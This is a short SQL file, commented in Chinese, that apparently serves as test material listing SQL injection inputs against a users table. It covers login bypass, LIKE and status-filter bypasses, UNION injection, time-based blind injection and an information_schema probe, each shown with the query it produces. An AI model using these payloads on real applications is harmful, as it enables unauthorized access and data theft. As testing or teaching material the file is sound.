-- SQL 注入示例
-- 本文件包含针对 users 表不同字段的 SQL 注入测试示例

-- 1. username/password 登录绕过 (WHERE 拼接)
-- 示例 1: 用户名注入绕过登录
-- 输入: admin' --
-- 实际执行: SELECT COUNT(*) FROM users WHERE username = 'admin' --' AND password = '任意值'

-- 示例 2: 密码注入绕过登录
-- 输入: 任意用户名' OR '1'='1
-- 实际执行: SELECT COUNT(*) FROM users WHERE username = '任意用户名' OR '1'='1' AND password = '任意值'

-- 2. email LIKE 模糊注入 (搜索)
-- 示例: 搜索功能中使用 LIKE 注入
-- 输入: %' OR 1=1 --
-- 实际执行: SELECT * FROM users WHERE email LIKE '%' OR 1=1 --%'

-- 3. status 条件绕过 (过滤)
-- 示例: 状态过滤绕过
-- 输入: active' OR '1'='1
-- 实际执行: SELECT * FROM users WHERE status = 'active' OR '1'='1'

-- 4. description UNION 注入 (回显)
-- 示例: 联合查询注入
-- 输入: ' UNION SELECT 1, 'test', 'test', 'test@example.com', 'active', 'Test description' --
-- 实际执行: SELECT * FROM users WHERE description = '' UNION SELECT 1, 'test', 'test', 'test@example.com', 'active', 'Test description' --'

-- 5. 时间盲注示例
-- 输入: ' AND SLEEP(5) --
-- 实际执行: SELECT * FROM users WHERE username = '' AND SLEEP(5) --'

-- 6. 报错注入示例
-- 输入: ' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
-- 实际执行: SELECT * FROM users WHERE username = '' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --'
